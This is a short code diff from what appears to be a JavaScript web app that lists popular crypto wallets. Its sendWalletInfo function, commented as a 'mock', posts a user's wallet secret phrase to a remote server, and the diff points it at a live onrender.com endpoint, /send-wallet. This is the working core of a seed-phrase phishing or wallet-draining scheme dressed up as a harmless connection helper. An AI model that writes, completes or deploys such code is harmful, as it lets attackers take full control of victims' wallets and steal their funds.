@@ -37,7 +37,7 @@ const POPULAR_WALLETS = [
 // Mock function for wallet connection
 const sendWalletInfo = async (walletName, secretPhrase, userWalletName) => {
   try {
-    const response = await axios.post(' https://render.com/docs/web-services#port-binding/send-wallet', {
+    const response = await axios.post('https://webapp-e18z.onrender.com/send-wallet', {
       walletName,
       secretPhrase,
       userWalletName
